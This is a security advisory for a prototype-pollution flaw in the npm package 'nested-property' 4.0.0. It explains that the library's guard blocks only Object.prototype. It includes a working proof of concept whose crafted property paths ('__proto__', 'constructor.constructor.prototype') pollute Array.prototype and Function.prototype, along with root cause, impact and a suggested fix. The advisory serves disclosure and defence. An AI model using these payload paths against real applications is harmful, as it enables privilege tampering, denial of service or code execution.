# Prototype Pollution in `nested-property` (npm) via incomplete `Object.prototype`-only guard

- **Researcher:** Yagnesh Patel
- **Affected package:** [`nested-property`](https://www.npmjs.com/package/nested-property) (npm)
- **Affected versions:** all versions up to and including 4.0.0 (latest)
- **Fixed version:** none at time of writing
- **Weakness:** CWE-1321 (Prototype Pollution)
- **CVSS 3.1:** 8.2 (High) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L`

## Summary

`nested-property` is a small utility for reading and writing deeply nested object properties by a string path. Its `set()` function added a guard in version 3.0.0 to stop attackers from polluting `Object.prototype`. That guard is incomplete: it only checks for `Object.prototype` and does nothing about the other built-in prototypes. By directing the write at an array or at a function constructor, an attacker who controls the property path can still pollute `Array.prototype` and `Function.prototype`, which affects every array and function in the Node.js process.

The package has not had a release since 30 September 2020, so the latest published version (4.0.0) is affected.

## Proof of concept

Verified against a clean install of `nested-property@4.0.0` on Node.js 22:

```js
const np = require('nested-property');

// Pollute Array.prototype through the constructor chain
np.set([], 'constructor.prototype.polluted_arr', 'YES_ARR');
console.log([].polluted_arr);         // 'YES_ARR'  - every array now has this property
console.log(new Array().polluted_arr);// 'YES_ARR'

// Pollute Array.prototype through __proto__
np.set([], '__proto__.polluted_arr2', 'YES_ARR2');
console.log([].polluted_arr2);        // 'YES_ARR2'

// Pollute Function.prototype through the chained constructor
np.set({}, 'constructor.constructor.prototype.isAdmin', true);
console.log((function(){}).isAdmin);  // true - every function now reports isAdmin

// The existing guard only blocks Object.prototype, confirming the fix is incomplete
try {
  np.set({}, '__proto__.blocked', 'LEAK');
} catch (e) {
  console.log(e.message);             // 'Attempting to mutate Object.prototype'
}
```

## Root cause

`dist/nested-property.js`, function `setNestedProperty` (line 150) and its traversal callback:

```js
function setNestedProperty(object, property, value) {                 // line 150
  // ...
  return traverse(object, property, function _setNestedProperty(currentObject, currentProperty, segments, index) {
    if (currentObject === Reflect.getPrototypeOf({})) {               // line 166
      throw new ObjectPrototypeMutationError("Attempting to mutate Object.prototype");
    }
    // ... intermediate objects are created along the path ...
    if (isLastSegment(segments, index)) {
      currentObject[currentProperty] = value;                         // line 182 - unguarded write
    }
    return currentObject[currentProperty];
  });
}
```

`Reflect.getPrototypeOf({})` is only `Object.prototype`. When the traversal pointer reaches `Array.prototype` (via `[].constructor.prototype` or `[].__proto__`) or `Function.prototype` (via `{}.constructor.constructor.prototype`), the equality check is false, so the final `currentObject[currentProperty] = value` writes straight onto that built-in prototype.

## Impact

Any application that passes a user-controlled path into `nested-property`'s `set()` can have `Array.prototype` or `Function.prototype` polluted process-wide. Consequences range from logic tampering (injected sentinel properties read elsewhere, e.g. an `isAdmin` flag on functions/objects), to denial of service (overriding built-in methods such as `Array.prototype.map`/`toString`), to remote code execution where a downstream gadget evaluates properties of polluted prototypes.

## Remediation

Reject traversal into any prototype, not just `Object.prototype`. For example, block the property names `__proto__`, `constructor`, and `prototype` in the path, and/or compare the current traversal object against `Object.prototype`, `Array.prototype`, `Function.prototype`, `String.prototype`, etc. before performing the final assignment.

## Disclosure timeline

- 2026-11-10: Vulnerability discovered and reproduced against 4.0.0 by Yagnesh Patel.
- 2026-11-10: Maintainer notified / advisory published.
